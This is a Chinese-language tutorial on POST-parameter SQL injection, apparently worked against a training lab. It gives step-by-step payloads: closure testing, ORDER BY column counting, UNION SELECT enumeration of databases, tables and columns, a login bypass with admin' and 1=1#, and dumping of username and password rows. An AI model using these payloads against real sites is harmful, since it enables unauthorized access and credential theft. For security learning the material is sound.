# 原创
：  【SQL注入】POST注入：高危点、利用过程

# 【SQL注入】POST注入：高危点、利用过程

**目录**

[一、简介：](#%E4%B8%80%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A)

[1.1、方法：](#1.1%E3%80%81%E6%96%B9%E6%B3%95%EF%BC%9A)

[1.2、高危点：](#1.2%E3%80%81%E9%AB%98%E5%8D%B1%E7%82%B9%EF%BC%9A)

[二、利用过程1：](#%E4%BA%8C%E3%80%81%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B%EF%BC%9A)

[ 2.1、第一步：判断是否存在SQL漏洞](#2.1%E3%80%81%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8SQL%E6%BC%8F%E6%B4%9E)

[2.2、第二步：判断字段数](#2.2%E3%80%81%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0)

[2.3、第三步：判断回显点](#2.3%E3%80%81%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E5%88%A4%E6%96%AD%E5%9B%9E%E6%98%BE%E7%82%B9)

[2.4、第四步：查询当前数据库](#2.4%E3%80%81%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E6%9F%A5%E8%AF%A2%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93)

[2.5、第五步：查表名](#2.5%E3%80%81%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E6%9F%A5%E8%A1%A8%E5%90%8D)

[2.6、第六步：查字段](#2.6%E3%80%81%E7%AC%AC%E5%85%AD%E6%AD%A5%EF%BC%9A%E6%9F%A5%E5%AD%97%E6%AE%B5)

[2.7、第七步：查数据](#2.7%E3%80%81%E7%AC%AC%E4%B8%83%E6%AD%A5%EF%BC%9A%E6%9F%A5%E6%95%B0%E6%8D%AE)

[三：利用过程2](#%E4%B8%89%EF%BC%9A%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B2)

[简介：](#%E7%AE%80%E4%BB%8B%EF%BC%9A)

[过程：](#%E8%BF%87%E7%A8%8B%EF%BC%9A)

[第一步：](#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A)

[第二步：](#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A)

[第三步：](#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A)

---


## 一、简介：

> 
<h3>1.1、方法：</h3>
使用`POST`进行传入参数的注入（输入框中注入）
能达到的效果更明显
GET中注释使用--+
POST中注释使用#
<hr/>
<h3>1.2、高危点：</h3>
交互框：
登录框
查询框
各种和数据库有交互的框


### 1.2、高危点：

---


---


## 二、利用过程1：

> 
<h3> 2.1、第一步：判断是否存在SQL漏洞</h3>
在输入框中填入一些闭合的符号，看页面是否异常
如： ’        "          ')          ")
当页面发生错误，则证明闭合有效
有时单双引号闭合后，还要考虑括号个数
<hr/>
<h3>2.2、第二步：判断字段数</h3>
例如：
”)order by 3#
当回显正确的时候，就判断出字段数
<hr/>
<h3>2.3、第三步：判断回显点</h3>
使用union 联合查询找到回显点
例如：
") union select 1,2,3#
<hr/>
<h3>2.4、第四步：查询当前数据库</h3>
例如：
") union select 1,database(),3#
<hr/>
<h3>2.5、第五步：查表名</h3>
例如：
") union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=“security” #
<hr/>
<h3>2.6、第六步：查字段</h3>
例如：
") union select 1,2,group_concat(column_name) from information_schema.columns where table_name=“users” #
<hr/>
<h3>2.7、第七步：查数据</h3>
例如：
")union select 1,username,password from users where id=2 #



### 2.2、第二步：判断字段数

---


### 2.4、第四步：查询当前数据库

---


### 2.6、第六步：查字段

---


---


---


## 三：利用过程2

> 
<h3>简介：</h3>
在代码中，账号输入框和密码输入框是连着的
在第一个代码框最后注释掉后面内容后，就不需要输入密码了


> 
<h3>过程：</h3>
<h4>第一步：</h4>
还是先找是不是有注入点
输入了一个单引号显示错误，说明可能存在注入点，符号可能为单引号


<hr/>

<h4>第二步：</h4>
点击post date输入
uname=admin' and 1=1#&amp;passwd=admin&amp;submit=Submit
（或者在第一个框输入admin' and 1=1#  第二个框输入admin  最后点击submit）

<hr/>

<h4>第三步：</h4>
执行其他读取修改数据等操作（常规操作了）
例如
admin' and 1=2 union select 1,database()# 


猜显示位数，获取数据库，获取表名，获取列名，获取数据
<blockquote>
①uname=admin' and 1=2 union select 1,2 #&amp;passwd=admin&amp;submit=Submit
②uname=admin' and 1=2 union select database(),2 #&amp;passwd=admin&amp;submit=Submit
③uname=admin' and 1=2 union select group_concat(table_name),2 from information_schema.tables where table_schema=database()#&amp;passwd=admin&amp;submit=Submit
④uname=admin' and 1=2 union select group_concat(column_name),2 from information_schema.columns where table_schema=database() and table_name='users'#&amp;passwd=admin&amp;submit=Submit
⑤uname=admin' and 1=2 union select username,password from users #&amp;passwd=admin&amp;submit=Submit


#### 第一步：

---


#### 第三步：
